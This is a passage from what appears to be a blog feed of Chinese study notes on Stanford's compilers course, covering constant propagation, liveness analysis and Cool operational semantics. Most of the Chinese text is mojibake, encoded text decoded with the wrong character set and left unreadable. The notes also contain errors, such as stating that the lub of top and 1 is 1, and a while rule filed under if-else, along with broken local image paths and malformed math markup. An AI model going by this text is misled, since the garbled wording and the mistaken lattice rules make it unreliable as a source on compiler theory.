type="1"><li>å¦‚æœå…¶å…¥åº¦èŠ‚ç‚¹å…¶ä¸­æœ‰ä¸€ä¸ªæ˜¯Tï¼Œåˆ™è¯¥èŠ‚ç‚¹ä¿¡æ¯ä¸ºT</li><li>å¦‚æœå…¶å…¥åº¦èŠ‚ç‚¹å­˜åœ¨å¸¸é‡ï¼Œä½†æ˜¯å‡ä¸ç›¸ç­‰ï¼Œåˆ™è¯¥èŠ‚ç‚¹ä¿¡æ¯ä¸ºT</li><li>å¦‚æœå…¶å…¥åº¦èŠ‚ç‚¹å­˜åœ¨èŠ‚ç‚¹å›ºå®šä¸ºæŸä¸ªå¸¸é‡ï¼Œä¸”å…¶å…¥åº¦èŠ‚ç‚¹ä¸ä¸ºTï¼Œåˆ™è¯¥èŠ‚ç‚¹ä¹Ÿä¸ºè¯¥å¸¸é‡</li><li>å¦‚æœå…¶å…¥åº¦èŠ‚ç‚¹å‡ä¸ºunknownï¼Œåˆ™è¯¥èŠ‚ç‚¹ä¸ºunknown</li></ol></li><li>é’ˆå¯¹æŸä¸ªèŠ‚ç‚¹çš„å‡ºåº¦ï¼Œ<ol start="5" type="1"><li><p>å…¥åº¦ä¸ºunknownï¼Œåˆ™å‡ºåº¦ä¹Ÿä¸ºunknown</p></li><li><p>åœ¨sè¯­å¥èµ‹å€¼ä¸ºæŸä¸ªå¸¸é‡ï¼Œåˆ™å‡ºåº¦ä¸ºè¯¥å¸¸é‡</p></li><li><p>åœ¨sè¯­å¥èµ‹å€¼ä¸ºæŸä¸ªéå¸¸é‡è¡¨è¾¾å¼ï¼Œåˆ™å‡ºåº¦ä¸ºT</p></li><li><p>sè¯­å¥å¦‚æœæ²¡æœ‰å¯¹å…¥åº¦èŠ‚ç‚¹åšä»»ä½•æ›´æ”¹ï¼Œåˆ™å‡ºåº¦=å…¥åº¦</p></li></ol></li></ul><p><strong>ä¼ªä»£ç æè¿°å¸¸é‡ä¼ æ’­ï¼š</strong></p><blockquote><p>For every entry s to the program,ï¼Œset C(s, x, in) = <spanclass="math inline">\(\top\)</span> set C(s, x, in) = C(s, x, out) =<span class="math display">\[\perp\]</span> everywhere else repeat utilall points satisfy 1-8ï¼š Pick s not satisfying 1-8 and update using theappropriate rule</p></blockquote><p><strong>ä¸ºä»€ä¹ˆè¦å¼•å…¥$ $ï¼Ÿ</strong></p><p>ç”±äºå¾ªç¯ï¼Œå¾ªç¯çš„æ¯ä¸ªç‚¹éƒ½éœ€è¦å€¼å­˜åœ¨</p><p>ç›´è§‰ä¸Šï¼Œåˆ†é…ä¸€äº›åˆå§‹å€¼å»æ‰“ç ´å¾ªç¯</p><p>$ $è¡¨ç¤ºç›´åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæ§åˆ¶æµç¨‹è¿˜æ²¡æœ‰åˆ°è¾¾å½“å‰ç‚¹ï¼›</p><p><spanclass="math inline">\(\top\)</span>äº‹ä¸€ç§æŠ½è±¡å€¼ï¼Œå› ä¸ºä¸çŸ¥é“è¿è¡Œçš„æ—¶å€™å…·ä½“çš„å€¼ï¼Œ</p><p>Cä¹‹é—´æ˜¯ä¸å¯æ¯”è¾ƒçš„</p><p><span class="math inline">\(\top\)</span>æ˜¯æœ€å¤§çš„ï¼Œ$ $æ˜¯æœ€å°çš„</p><p><strong>ç¬¦å·å½¢å¼åŒ–ï¼š</strong></p><p>å¯¹æ˜¯$ ,, C$è¿›è¡Œæ’åºï¼š <span class="math display">\[\perp &lt; C &lt; \top\]</span> å¯ä»¥å½¢è±¡åŒ–å¦‚ä¸‹ï¼š</p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230520134741534.png"alt="image-20230520134741534" /><figcaption aria-hidden="true">image-20230520134741534</figcaption></figure><p>å®šä¹‰ <code>lub</code> è¿ç®—ï¼š åœ¨è¿™ä¸ªå±‚çº§è§„åˆ™ä¸‹çš„æœ€å°ä¸Šç•Œ</p><p><code>lub(x, y, z, ..)</code>ï¼šå¤§äºç­‰äºx,y,z,...çš„æœ€å°å€¼</p><p>éƒ¨åˆ†å¯ä»¥å†™ä½œï¼š</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-constructor">C(<span class="hljs-params">s</span>, <span class="hljs-params">x</span>, <span class="hljs-params">in</span>)</span> = lub &#123; <span class="hljs-constructor">C(<span class="hljs-params">p</span>, <span class="hljs-params">x</span>, <span class="hljs-params">out</span>)</span> <span class="hljs-pattern-match">| p is a predecessor <span class="hljs-keyword">of</span> s &#125;</span><br><span class="hljs-pattern-match"></span><br></code></pre></td></tr></table></figure><p>ğŸŒ°ï¼š</p><p><code>Lub(åˆ°, 1) = 1</code></p><p><code>Lub(T, 1) = 1</code></p><p><code>Lub(1, 2) = T</code></p><p>ä¹‹å‰ç®€å•çš„è¯´ä¸€ç›´é‡å¤ç›´åˆ°æ²¡ä»€ä¹ˆä¸œè¥¿å‘ç”Ÿå˜åŒ–æ‰åœæ­¢æ˜¯ä¸å‡†ç¡®ï¼Œä¸è§„èŒƒçš„ï¼›</p><p>æ­£å¼æè¿°åº”è¯¥ä½¿ç”¨lubï¼Œlubä¸ºä»€ä¹ˆæ˜¯æ­£ç¡®çš„ï¼Ÿ</p><ul><li>values start as åˆ° and only increase</li><li>$ $ can change to a constant, and a constant to <spanclass="math inline">\(\top\)</span></li><li>Thus, <code>C(s, x, _)</code> can change at most twice</li></ul><p>å¸¸é‡æ‹·è´ç®—æ³•æ˜¯çš„æ—¶é—´å¤æ‚åº¦å’Œç¨‹åºå¤§å°æˆæ­£æ¯”</p><blockquote><p>Number of steps =</p><p>Number of C(...) values computed * 2 =âœ–ï¸2æ˜¯å› ä¸ºæ¯ä¸ªè¯­å¥çš„æœ€å¤šç®—ä¸¤æ¬¡</p><p>Number of program statements * 4 âœ–ï¸2æ˜¯å› ä¸ºæ¯ä¸ªè¯­å¥çš„in and out</p></blockquote><p><strong>å˜é‡ç”Ÿå­˜åˆ†æï¼š</strong></p><p>ä»ç¨‹åºé€€å‡ºèŠ‚ç‚¹å¼€å§‹åˆ†æï¼Œå‘ä¸Šå›æº¯èŠ‚ç‚¹ï¼Œ</p><ol type="1"><li>å¦‚æœå½“å‰èŠ‚ç‚¹åŒ…å«å‡ºåº¦çš„æ´»è·ƒå˜é‡çš„èµ‹å€¼è¯­å¥ï¼Œåˆ™å½“å‰èŠ‚ç‚¹çš„å…¥åº¦ï¼Œå°±ä¸ä¼šåœ¨æœ‰è¿™ä¸ªæ´»è·ƒå˜é‡(å› ä¸ºé‡æ–°èµ‹å€¼äº†ï¼Œä¹‹å‰çš„ç›¸å½“äºæ˜¯deadcodeï¼Œå¯ä»¥è¢«è§†ä¸ºdead variable)ï¼›</li><li>å¦‚æœå½“å‰èŠ‚ç‚¹çš„rfsï¼ˆå³è¡¨è¾¾å¼ï¼‰åŒ…å«æŸä¸ªå˜é‡ï¼Œåˆ™è¿™äº›å˜é‡æ˜¯æ´»è·ƒå˜é‡ï¼›</li></ol><figure><imgsrc="https://github.com/Doraemonzzz/md-photo/blob/master/Compiler/Week8%20P2/2021050601.jpg?raw=true"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">æœ‰ä¸¤ä¸ªexitèŠ‚ç‚¹ï¼ŒinitNode = </span><span class="hljs-template-variable">&#123; a, b &#125;</span><span class="language-xml">, lives = </span><span class="hljs-template-variable">&#123; b &#125;</span><span class="language-xml">ï¼Œå¼€å§‹è‡ªåº•å‘ä¸Šåˆ†æ</span><br><span class="language-xml"></span><br><span class="language-xml">b = f + c ä½¿ç”¨äº†få’Œcï¼Œäº§ç”Ÿäº†bï¼Œæ ¹æ®è§„åˆ™2ï¼Œå…¥åº¦é‡Œfå’Œcæ˜¯æ´»è·ƒå˜é‡ï¼Œæ ¹æ®è§„åˆ™1å…¥åº¦é‡Œbä¸æ˜¯æ´»è·ƒå˜é‡ </span><span class="hljs-template-variable">&#123;f, c&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">f = 2 * e ä½¿ç”¨äº†eï¼Œæ ¹æ®è§„åˆ™2ï¼Œå…¥åº¦é‡Œeæ˜¯æ´»è·ƒå˜é‡ï¼Œfæ˜¯æ–°çš„èµ‹å€¼ï¼Œæ ¹æ®è§„åˆ™1å…¥åº¦é‡Œfä¸æ˜¯æ´»è·ƒå˜é‡ï¼Œæ ¼å±€è§„åˆ™3ï¼Œcçš„æ´»è·ƒä¸å‘ç”Ÿå˜åŒ– </span><span class="hljs-template-variable">&#123;c, e&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">b = d + eï¼Œä½¿ç”¨äº†då’Œeï¼Œæ ¹æ®è§„åˆ™2ï¼Œdå’Œeæ˜¯æ´»è·ƒå˜é‡ï¼Œè€Œbè¢«èµ‹å€¼äº†ï¼Œcå’Œfæœªå‡ºç°1åœ¨å·¦ä¾§ï¼Œæ‰€ä»¥</span><span class="hljs-template-variable">&#123;c,d,e,f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">e = e + 1, ä½¿ç”¨äº†eï¼Œæ ¹æ®è§„åˆ™1ï¼Œeæ˜¯æ´»è·ƒå˜é‡ï¼Œè€Œcå’Œfä»¥åŠbéƒ½æ˜¯å…¶åç»­èŠ‚ç‚¹éœ€è¦çš„ï¼Œæ‰€ä»¥</span><span class="hljs-template-variable">&#123;b, c, e, f &#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">å¯¹äºåˆ†æ”¯å¤„ï¼Œå–å¹¶é›†å¾—ï¼š</span><span class="hljs-template-variable">&#123;b, c, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">å¯¹äºf = 2 * eçš„å…¥åº¦ï¼Œfè¢«é‡æ–°èµ‹å€¼ï¼Œè€Œeæ˜¯è¢«ç”¨çš„ï¼Œæ‰€ä»¥</span><span class="hljs-template-variable">&#123; c, e &#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">åŒç†å¯¹äº b = d + eå’Œe = e + 1çš„å…¥åº¦ï¼Œå…¶æ´»è·ƒå˜é‡å·²ç»è®¡ç®—è¿‡ï¼š</span><span class="hljs-template-variable">&#123;c, d, e, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">å–å¹¶é›†çš„e = d + fçš„å‡ºåº¦ </span><span class="hljs-template-variable">&#123;c, d, e, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">e = d + fçš„å…¥åº¦ =&gt; </span><span class="hljs-template-variable">&#123;c, d, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">d = -a çš„å…¥åº¦ =&gt; </span><span class="hljs-template-variable">&#123;c, a, f&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">a = b + cçš„å…¥åº¦ =&gt; </span><span class="hljs-template-variable">&#123;f, c, b&#125;</span><br></code></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼š</strong></p><p>å˜é‡åˆ†ææ˜¯è‡ªåº•å‘ä¸Šï¼Œä»ç¨‹åºçš„é€€å‡ºèŠ‚ç‚¹å›æº¯çš„ï¼Œå› ä¸ºç¨‹åºé€€å‡ºçš„æ—¶å€™ï¼Œå¯èƒ½å¸Œæœ›æŸäº›å˜é‡ä¾æ—§ä¿å­˜</p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€ï¼Œcool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ–¯å¦ç¦cs231(ç¼–è¯‘åŸç†)ã® 6 Cool Operational semantics</title>
    <link href="/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AD/"/>
    <url>/emocoder/2023/05/14/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æ˜¯æ–¯å¦ç¦cs143ç¼–è¯‘åŸç†çš„ç¬”è®°ï¼Œå†…å®¹å¤§éƒ¨åˆ†æ¥è‡ªäºè¯¾ä»¶å’Œè‡ªå·±çš„ç†è§£ï¼Œç¬”è€…èƒ½åŠ›å’Œç²¾åŠ›æœ‰é™ï¼Œå¦‚æœæœ‰é”™è¯¯æ¬¢è¿æŒ‡å‡ºã€‚</p><h2 id="å¼•è¨€">å¼•è¨€</h2><p>ç±»æ¯”ï¼š</p><p>parseré˜¶æ®µï¼Œæˆ‘ä»¬è¦ç»™æ¯ç§tokenè®¾ç½®å¯¹åº”çš„action</p><p>è¯­æ³•åˆ†æé˜¶æ®µï¼Œæœ‰ä¸€ç³»åˆ—çš„æ–‡æ³•å¼ï¼Œè¦åœ¨æ¯ä¸ªæ–‡æ³•å¼è§„çº¦çš„æ—¶å€™è®¾ç½®actionï¼Œè§„å®šå¯¹åº”çš„è¡Œä¸º</p><p>ç±»å‹åˆ†æé˜¶æ®µï¼šå¯¹æ¯ä¸€ç§è¡¨è¾¾å¼è®¾ç½®å¯¹åº”çš„è¯­ä¹‰åŠ¨ä½œï¼Œè¿›è¡Œè¯­ä¹‰åˆ†æ</p><p>åŒæ ·çš„ä¼˜åŒ–é˜¶æ®µï¼šå¯¹æ¯ä¸€ç§è¡¨è¾¾å¼è®¾ç½®å¯¹åº”çš„ä»£ç ç”ŸæˆåŠä¼˜åŒ–åŠ¨ä½œã€‚</p><p>å¦‚ä½•å½¢å¼åŒ–è¡¨ç¤ºè¿™äº›è¡¨è¾¾å¼å¯¹åº”åŠ¨ä½œï¼ˆè¯­ä¹‰ï¼Œæˆ‘ç†è§£å°±æ˜¯è¡¨è¾¾å¼çš„åŠ¨ä½œï¼‰</p><blockquote><p>Denotational semantics: æ•°å­¦å‡½æ•°è¡¨ç¤º</p><p>Axiomatic semantics: é€šè¿‡é€»è¾‘å…¬å¼æè¿°ç¨‹åºè¡Œ</p><p>Operational sematics: é€šè¿‡æ‰§è¡Œè§„åˆ™æè¿°ç¨‹åºè¯„ä¼°</p></blockquote><h2 id="æ“ä½œè¯­ä¹‰">æ“ä½œè¯­ä¹‰</h2><p>åœ¨ç±»å‹æ¨æ–­å’Œæ£€æŸ¥çš„æ—¶å€™ï¼Œå¼•è¿›è¿‡è¿™æ ·ä¸€ç§ç¬¦å·ï¼š <spanclass="math display">\[Context \vdash e: Cåœ¨ç»™å®šå¤§çš„ä¸Šä¸‹æ–‡contexté‡Œï¼Œè¡¨è¾¾å¼æ˜¯ç±»å‹C\]</span>åŒæ ·çš„ï¼Œè¯„ä¼°é˜¶æ®µ(ä»£ç ç”Ÿæˆé˜¶æ®µä¹‹å‰çš„å‡†å¤‡å·¥ä½œ)ï¼Œä¹Ÿä¼šç”¨ç±»ä¼¼çš„ç¬¦å·ï¼š <spanclass="math display">\[Context \vdash e: våœ¨ç»™å®šå¤§çš„ä¸Šä¸‹æ–‡contexté‡Œï¼Œè¡¨è¾¾å¼ä¼šè¢«è¯„ä¼°ä¸ºå€¼v\]</span> ğŸŒ°ï¼š <span class="math display">\[\frac{Context \vdash e1: 5 \quadContext \vdash e2: 7}{Context \vdash e1 + e2: 12}\]</span> &gt;åœ¨è¯­å¢ƒContextä¸‹e1è¢«è¯„ä¼°ä¸º5ï¼Œe2è¢«è¯„ä¼°ä¸º7ï¼Œé‚£ä¹ˆe1+e2å°±æ˜¯12ï¼Œå½“ç„¶è¿™ç§æ˜¯å¸¸é‡æ¯”è¾ƒç®€å•å“ˆï¼Œæ²¡ä»€ä¹ˆç”¨å¤„ï¼Œå®é™…æƒ…å†µä¸‹æœ‰å˜é‡çš„æƒ…å†µä¸‹å°±å¤æ‚äº†ï¼›&gt;</p><p>è€ƒè™‘è¯„ä¼°ï¼šy &lt;- x + 1</p><p>ç”±äºå­˜åœ¨å±€éƒ¨ä½œç”¨åŸŸï¼Œæ‰€ä»¥è¯„ä¼°ä¸€ä¸ªå€¼ï¼Œéœ€è¦ï¼š</p><p>Environment: where in memory a variable is</p><p>Store: what is in the memory</p><p>ç®€å•æ¥è¯´å°±æ˜¯ä¸¤ä¸ªæ˜ å°„è¡¨ï¼š</p><p>Enviromentï¼šva r =&gt; loc</p><p>Store: loc =&gt; value</p><p>å½¢å¼åŒ–è¡¨ç¤ºï¼š</p><p><span class="math display">\[E = [a: l1, b: l2] \quad å˜é‡aåœ¨å†…å­˜ä¸­çš„l1å¤„ï¼Œbåœ¨å†…å­˜çš„l2å¤„ \\S = [l1 =&gt; 5, l2 =&gt; 7] \quad l1å¤„å­˜å‚¨çš„å€¼æ˜¯5ï¼Œl2å¤„å­˜å‚¨çš„å€¼æ˜¯7 \\S&#39; = S[l2/l1] \quad defines \quad a \quad store \quadS&#39;\quad  such \quad that \\ S&#39;(l1) = 12 \quad and\quad  S&#39;(l) = S(l) \quad  if \quad l \neq l1 \\ç®€å•ç†è§£ä¸‹S&#39;å°±æ˜¯Såœ¨l1å¤„åšäº†å•ç‚¹ä¿®æ”¹\]</span></p><h2 id="coolé‡Œçš„è¯­ä¹‰">coolé‡Œçš„è¯­ä¹‰</h2><p>coolé‡Œé¢å€¼éƒ½æ˜¯å¯¹è±¡ï¼ˆcoolæ˜¯é¢å‘å¯¹è±¡çš„è¯­è¨€ï¼‰</p><p><code>X(a1 = l1, ..., an = ln)</code> è¡¨ç¤ºä¸ºä¸€ä¸ªcool å¯¹è±¡ï¼Œå…¶ä¸­</p><ul><li><p>Xæ˜¯ç±»</p></li><li><p>aiæ˜¯å…¶å±æ€§ï¼ŒåŒ…å«ç»§æ‰¿çš„å±æ€§</p></li><li><p>liæ˜¯å¯¹åº”aiè¢«å­˜å‚¨çš„å†…å­˜ä½ç½®</p></li></ul><p><strong>coolå†…ç½®ç±»ï¼š</strong></p><ul><li>Int(5),</li><li>Bool(true)</li><li>String(4, "cool") the string "Cool" of length 4</li><li>ç‰¹æ®Šå€¼ï¼švoidï¼Œè¯¥å¯¹è±¡ä¸Šæ²¡æœ‰æ–¹æ³•ï¼Œå¦‚æœè°ƒç”¨isvoidå°†ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œcoolé‡Œå¯¹voidçš„å…·ä½“å®ç°æ—¶NULLï¼ˆCppé‡Œçš„ç©ºæŒ‡é’ˆï¼Œå› ä¸ºcoolæ˜¯ç”¨cppå®ç°çš„ï¼‰</li></ul><p>è€ƒè™‘å¦‚ä¸‹è¯„ä¼°å¼ï¼š <span class="math display">\[{so, E, S \vdash e: v, S&#39;}\]</span> so(self object)ï¼Œ E æ˜¯å½“å‰çš„å˜é‡ç¯å¢ƒï¼ŒSæ˜¯å½“å‰Storeï¼›</p><p>eè·å¾—äº†è¯„ä¼°ç»“æœåå€¼æ˜¯vï¼Œå¹¶ä¸”æ–°çš„storeæ˜¯Sâ€˜</p><p>è¯„ä¼°çš„ç»“æœå®é™…æ˜¯å€¼vå’Œæ–°çš„Storeï¼Œæ–°çš„Storeæ˜¯æœ‰å‰¯ä½œç”¨(å‰¯ä½œç”¨æ˜¯å€¼å¼•ç”¨ä¿®æ”¹ï¼Œè€Œä¸æ˜¯copy)</p><p>ä½†æ˜¯åœ¨è¯„ä¼°åæœ‰ä¸€äº›äº‹ä¸ä¼šæ”¹å˜çš„ï¼š</p><ul><li><p>å˜é‡ç¯å¢ƒ</p></li><li><p>self</p></li><li><p>æ“ä½œè¯­ä¹‰å…è®¸é€’å½’</p></li></ul><p>ä¸‹é¢å…·ä½“ä»‹ç»äº†coolçš„ä¸€äº›æ“ä½œè¯­ä¹‰è¯„ä¼°ï¼Œæˆ‘å°±ç®€å•é‚£å‡ ä¸ªæ¯”è¾ƒç»å…¸çš„ï¼š</p><hr /><p><strong>å˜é‡ä½¿ç”¨</strong>ï¼šåœ¨Eä¸­æ‰¾åˆ°idçš„ä½ç½®ï¼Œç„¶ååœ¨Sä¸­æ‰¾å¯¹åº”çš„å€¼<span class="math display">\[\frac{E(id) = I_{id} \quadS(I_{id}) = v}{so, E, S \vdash id: v, S}\]</span> ------</p><p><strong>self:</strong> <span class="math display">\[{so, E, S \vdash self: so, S}\]</span> ------</p><p><strong>å˜é‡èµ‹å€¼ï¼š</strong>å°±æ˜¯å¯¹idå¤„åšå•ç‚¹ä¿®æ”¹è¿”å›æ–°çš„Storeï¼Œidçš„è¯„ä¼°ç»“æœå°±æ˜¯eçš„è¯„ä¼°ç»“æœv<span class="math display">\[\frac{so, E, S \vdash e: v, S_1 \quadE(id) = I_{id} \quadS_2 = S_1[v/id]}{so, E, S \vdash id=e: v, S2}\]</span> e1+e2ï¼šå…ˆé€’å½’å¯¹e1è¯„ä¼°ï¼Œè¯„ä¼°åe1çš„å€¼æ˜¯v1ï¼Œå¹¶äº§ç”Ÿæ–°çš„StoreS1ï¼Œæ¥ç€å¯¹e2é€’å½’è¿›è¡Œè¯„ä¼°ï¼Œè¯„ä¼°åe2çš„å€¼æ˜¯v2ï¼Œå¹¶äº§ç”Ÿæ–°çš„StoreS2ï¼Œæœ€ç»ˆe1+e2çš„è¯„ä¼°ç»“æœå°±æ˜¯å€¼ä¸ºv1 + v2ï¼Œæ–°çš„Store S2 <spanclass="math display">\[\frac{so, E, S \vdash e: v, S_1 \quadso, E, S1 \vdash e: v2, S_2}{so, E, S \vdash e1 + e2: v1 + v2, S2}\]</span> ------</p><p>ğŸŒ°ï¼š{ X = 7 + 5; 4;}</p><p>å…ˆå¯¹ä¸€ä¸ªè¡¨è¾¾å¼X=7+5è¯„ä¼° <span class="math display">\[{so, [X&lt;-1], [l&lt;-0] \vdash x=7+5: ?, ?}\]</span> ç»§ç»­é€’å½’å¯¹7+5è¿›è¡Œè¯„ä¼° <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7+5: ?, ?}\]</span> ç»§ç»­é€’å½’å¯¹7è¯„ä¼°ï¼š <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7: Int(7), [l&lt;-0]}\]</span> åŒæ ·çš„å¯¹5è¯„ä¼°ï¼š <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 5: Int(5), [l&lt;-0]}\]</span></p><p>è¿”å›åˆ°ä¸Šä¸€å±‚7+5: <span class="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash 7+5: Int(12), [l&lt;-0]}\]</span> ç»§ç»­è¿”å›åˆ°ä¸Šä¸€å±‚x=7+5ï¼š</p><p>è¿™ä¸ªæ—¶å€™å·²ç»å¤„ç†å®Œäº†7+5ï¼Œç»§ç»­å¤„ç†xï¼Œè¿™æ˜¯å£°æ˜å˜é‡ï¼Œå¾—åˆ°å•ç‚¹æ›´æ–°åçš„Storeï¼š<span class="math display">\[[l&lt;-0](12/l) =&gt; [l/12]\]</span> è¿™ä¸ªæ—¶å€™å­è¡¨è¾¾å¼éƒ½å¤„ç†å®Œäº†ï¼Œç»§ç»­å¤„ç†æœ€å¤–å±‚çš„ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ <spanclass="math display">\[{so, [X&lt;-l], [l&lt;-0] \vdash x=7+5: 12, [l&lt;-12]}\]</span> ç»§ç»­å¤„ç†åŒçº§åˆ«çš„è¡¨è¾¾å¼4 <span class="math display">\[{so, [X&lt;-l], [l&lt;-12] \vdash 4: Int(4), [l&lt;-12]}\]</span></p><p><span class="math display">\[\frac{...}{so, [X&lt;-1], [1&lt;-0] \vdash \{X=7+5;4;\}: Int(4),[1&lt;-12]}\]</span></p><hr /><p><strong>if-else</strong></p><p><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173710435.png"alt="image-20230514173710435" /> <span class="math display">\[\frac{so, E, S \vdash e1: Bool(false), S1}{so, E, S \vdash while \quade1 \quad loop \quad e2 \quad pool: void, S1}\]</span> ------</p><p><strong>while</strong></p><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173719883.png"alt="image-20230514173719883" /><figcaption aria-hidden="true">image-20230514173719883</figcaption></figure><hr /><p><strong>å£°æ˜å˜é‡ï¼š</strong> <span class="math display">\[\frac{so, E, S \vdash e1: v1, S1 \quad so, ?, ? \vdash v, S2}{so, E, S\vdash let \quad id: T = e1 \quad in \quad e2: v2, S2}\]</span> e2åº”è¯¥åœ¨ä»€ä¹ˆç¯å¢ƒä¸‹è¯„ä¼°å‘¢ï¼ˆé—®å·å¤„åº”è¯¥å¡«ä»€ä¹ˆå‘¢ï¼‰ï¼Ÿ</p><p>â€”ä»ç„¶æ˜¯Eï¼Œä½†æ˜¯Eé‡Œåº”è¯¥æ–°å¢æ˜ å°„<code>id =&gt; Inew</code>ï¼Œè¡¨ç¤ºä¸ºidæ–°åˆ†é…äº†ä¸€å—å†…å­˜ï¼ŒåŒæ ·çš„Storeåº”è¯¥æ˜¯æœ‰æ–°çš„æ˜ å°„<code>Inew =&gt; v1</code></p><p>æ–°å¢ç¬¦å·ï¼šInew =newloc(S)ï¼Œè¡¨ç¤ºInewæ˜¯ä¸€ä¸ªæ–°åˆ†é…çš„å†…å­˜ï¼Œnewlocå¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªå†…å­˜åˆ†é…å‡½æ•°<span class="math display">\[\frac{so, E, S \vdash e1: v1, S1 \quad I_{new} = newloc(S1) \quad  so,E[I{new}/id], S1[v1/I_{new}] \vdash v2, S2}{so, E, S \vdash let \quadid: T = e1 \quad in \quad e2: v2, S2}\]</span></p><hr /><p><strong>newå¯¹è±¡çš„è¯„ä¼°è¯­ä¹‰ï¼š</strong></p><ul><li><p>é¦–å…ˆï¼Œä¸ºå¯¹è±¡çš„æ‰€æœ‰å‚æ•°åˆ†é…å†…å­˜ï¼ˆæœ¬è´¨ä¸Šå°±æ˜¯åˆ†é…å¯¹è±¡ï¼‰</p></li><li><p>ä¸ºå¯¹è±¡è®¾ç½®ç¼ºçœå€¼</p></li><li><p>è¯„ä¼°å¯¹è±¡çš„åˆå§‹åŒ–è¯­å¥ï¼Œå¹¶é‡æ–°è®¾ç½®å±æ€§å€¼</p></li><li><p>è¿”å›è¢«åˆ†é…çš„å¯¹è±¡</p></li></ul><p>æ¯ä¸ªå¯¹è±¡éƒ½æœ‰é»˜è®¤å€¼</p><ul><li><p>intï¼š Int(0)</p></li><li><p>bool: Bool(false)</p></li><li><p>String: String(0, '')</p></li></ul><p>ç±»Açš„å½¢å¼åŒ–è¡¨ç¤ºï¼š</p><p><code>class(A) = (a1: T1 &lt;-e1, ..., an: Tn &lt;- en)</code>ï¼Œå…¶ä¸­ï¼š</p><ul><li><code>ai</code>æ˜¯å±æ€§ï¼ŒåŒ…å«ç»§æ‰¿å±æ€§</li><li><code>Ti</code>æ˜¯å±æ€§çš„ç±»å‹</li><li><code>ei</code>æ˜¯åˆå§‹åŒ–è¡¨è¾¾å¼</li></ul><figure><imgsrc="/Users/bytedance/Library/Application%20Support/typora-user-images/image-20230514173910377.png"alt="image-20230514173910377" /><figcaption aria-hidden="true">image-20230514173910377</figcaption></figure><p>åœ¨è¯„ä¼°åˆå§‹åŒ–è¡¨è¾¾å¼é˜¶æ®µï¼š</p><ul><li><p>self is the current object</p></li><li><p>only the attributes are in scope()ï¼Œä½œç”¨åŸŸå†…åªæœ‰å±æ€§</p></li><li><p>å±æ€§çš„åˆå§‹å€¼éƒ½æ˜¯é»˜è®¤å€¼ï¼Œä¸»è¦æ˜¯é˜²æ­¢åœ¨åˆå§‹åŒ–è¯­å¥é‡Œé¢ä¼šç”¨åˆ°è¿™äº›åˆå§‹å€¼ï¼Œæ¯”å¦‚:<code>Class A &#123; a &lt;- a &#125;</code>ï¼Œç”¨aåˆå§‹åŒ–aï¼Œå¦‚æœaæ²¡æœ‰é»˜è®¤å€¼ï¼Œå¯èƒ½ä¼šæœ‰å¼‚å¸¸ï¼›</p></li></ul><p>Informal semantics of class e0.f(e1, ..., en)ï¼š</p><ul><li><p>é¦–å…ˆï¼Œä¾æ¬¡è¯„ä¼°å‚æ•°e1, ..., enï¼Œ</p></li><li><p>è¯„ä¼°e0ï¼Œè·å¾—e0çš„å€¼</p></li><li><p>å‡è®¾Xæ˜¯e0è¯„ä¼°ç»“æœçš„åŠ¨æ€ç±»å‹</p></li><li><p>ä»dispatch tableä¸­è·å–f</p></li><li><p>ä¸ºnä¸ªå‚æ•°åˆ†é…å†…å­˜ç©ºé—´ï¼Œæ›´æ–°Enviroment</p></li><li><p>ä¸ºåˆ†é…çš„ç©ºé—´åˆå§‹åŒ–å€¼</p></li><li><p>set selft to the target object and evaluate f's body</p></li></ul><p>For a class <code>A</code> and a method f of <code>A</code> (possibleinherited)</p><p><code>impl(A, f) = (X1, ..., Xn, 